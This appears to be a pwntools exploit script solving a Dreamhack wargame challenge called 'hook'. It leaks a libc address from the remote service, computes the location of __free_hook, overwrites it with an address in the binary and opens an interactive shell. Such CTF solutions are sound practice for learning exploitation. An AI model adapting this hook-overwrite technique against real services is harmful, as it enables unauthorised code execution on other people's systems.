from pwn import *

#p = process('./hook')
p = remote('host3.dreamhack.games', '16776')
libc = ELF('./libc-2.23.so')

p.recvuntil(b"stdout: ")
stdout = int(p.recvline()[:-1], 16)
print(hex(stdout))

binsh = 0x400a11
print(libc.symbols['_IO_2_1_stdout_'])
libc_base = stdout - libc.symbols['_IO_2_1_stdout_']
free_hook = libc_base + libc.symbols['__free_hook']

payload = p64(free_hook) + p64(binsh)

p.sendlineafter(b"Size: ", b"400")
p.sendlineafter(b"Data: ", payload)

p.interactive()
